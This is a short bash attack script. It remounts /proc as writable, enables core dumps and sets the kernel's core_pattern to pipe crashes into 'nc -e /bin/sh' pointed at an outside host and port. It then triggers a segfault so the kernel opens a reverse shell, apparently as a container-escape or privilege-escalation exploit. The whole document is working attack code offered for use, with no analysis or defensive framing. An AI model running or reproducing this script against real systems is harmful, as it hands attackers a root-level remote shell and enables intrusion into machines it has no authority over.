#!/bin/bash
export CONNECT_HOST="omar.li"
export CONNECT_PORT="12345"

mount -o remount rw /proc/
if [ $? -ne 0 ]; then
    echo "Couldn't remount /proc/ as rw";
    exit 1;
fi

ulimit -c unlimited
if [ $? -ne 0 ]; then
    echo "Couldn't enable core dumping";
    exit 2;
fi

echo "Remounted /proc/ as rw";
echo "|/bin/nc -e /bin/sh $CONNECT_HOST $CONNECT_PORT" > /proc/sys/kernel/core_pattern

if [ $? -ne 0 ]; then
    echo "Couldn't set up nc payload";
    exit 2;
fi

echo "Set up nc payload";
echo "Segfault in 3 seconds..."
sleep 3 && ./segfault 2>/dev/null &
